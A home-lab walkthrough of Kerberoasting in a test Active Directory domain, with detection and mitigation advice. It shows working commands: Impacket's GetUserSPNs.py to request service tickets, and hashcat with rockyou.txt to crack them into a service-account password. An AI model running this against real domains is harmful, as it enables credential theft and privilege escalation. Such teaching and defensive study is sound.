## What is Kerberoasting?

In Windows networks, services (like SQL Server, IIS, etc.) are registered with something called an SPN (Service Principal Name). When a user wants to access a service, Windows gives them an encrypted service ticket. That ticket is encrypted using the service account's password hash.
Here is the problem — any logged-in domain user can request that ticket, no special permissions needed. An attacker can grab that ticket, take it offline, and crack it to recover the real password.

## Objective

- Identify service accounts with SPNs
- Request Kerberos service tickets
- Extract and analyze ticket data
- Attempt offline password cracking
- Evaluate security posture of service account password policy


## How Kerberoasting Works

```
Domain User
     |
     | Requests TGS Ticket
     v
Domain Controller
     |
     | Returns Ticket
     | Encrypted with Service Account Password
     v
Attacker Extracts Ticket
     |
     | Offline Password Cracking
     v
Service Account Password Recovered
```

## Lab Setup

```
| Machine             | Role              |   Ip          |
|---------------------|-------------------|---------------|
| Windows Server 2022 | Domain Controller | 192.168.5.134 |
| Windows 10          | Domain User       | 192.168.5.142 |
| Kali Linux          | Attacker          | 192.168.5.128 |
```


I already have..
- Domain: readteambd.local
- User: rahimkhan
- Pass: Password1

## Attack Process

## Step 1 – Find Service Accounts

First step was to enumerate service accounts that have SPNs registered in Active Directory.
For this, I used Impacket’s `GetUserSPNs.py` tool.

```bash
GetUserSPNs.py readteambd.local/rahimkhan:Password1 -dc-ip 192.168.5.134 -request
```
This command lists all service accounts and automatically requests Kerberos service tickets in a crackable format.

```
| Part                  |                     Description                      |
|-----------------------|------------------------------------------------------|
| `GetUserSPNs.py`      | Impacket tool used for Kerberoasting.                |
|                       | Finds service accounts with SPNs in Active Directory |
|                       | and requests Kerberos service tickets (TGS)          |
| `readteambd.local`    | Active Directory domain name                         |
| `rahimkhan:Password1` | Domain username and password used to authenticate    |
| `-dc-ip 192.168.5.134`| IP address of the Domain Controller                  |
| `-request`            | Tells the tool to actually pull the TGS tickets in   |
|                       | crackable hash format                                |
```

**Output:**

```
GetUserSPNs.py readteambd.local/rahimkhan:Password1 -dc-ip 192.168.5.134 -request

## Step 2 – Save Hash to File

After identifying the service ticket, I saved the output into `kerberoast.txt` file for offline cracking.

```bash
GetUserSPNs.py readteambd.local/rahimkhan:Password1 -dc-ip 192.168.5.134 -request -outputfile kerberoast.txt
```
This file contains the Kerberos TGS hash required for password cracking.

## Step 3 – Crack the Ticket

Next, I used Hashcat to perform offline password cracking.

```bash
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

```
| Flag             |                 Description                     |
|------------------|-------------------------------------------------|
| `-m 13100`       | Hash mode — Kerberos 5 TGS-REP (etype 23 / RC4) |
| `kerberoast.txt` | The file containing the extracted hash          |
| `rockyou.txt`    | The wordlist used to crack the password         |
```

**Output:**

```
Status: Cracked
Hash Mode: 13100 (Kerberos 5, etype 23, TGS-REP)
Target Account: sqlservice
Recovered Password: Mypassword123#
```

## Why Kerberoasting is Dangerous

- Works with normal domain user privileges
- No need for administrative access
- Entire attack happens offline after ticket capture
- Targets service accounts, which often have weak passwords
- Can lead to privilege escalation and domain compromise

## Detection

- Monitor Event ID 4769 (Kerberos Service Ticket Requests)
- Unusual volume of ticket requests from a single user
- Requests for multiple SPNs in a short time
- Service ticket requests outside normal usage patterns

## Mitigation

- Use strong, long passwords for service accounts
- Prefer Group Managed Service Accounts (gMSA)
- Enforce least privilege for service accounts
- Regularly audit accounts with SPNs
- Restrict RC4 encryption where possible
- Monitor Kerberos activity continuously

## Key Takeaways

- Any domain user can perform Kerberoasting
- Attack targets service accounts with SPNs
- Tickets are cracked offline
- Weak service account passwords are the main risk
- Monitoring Event ID 4769 helps detect suspicious activity
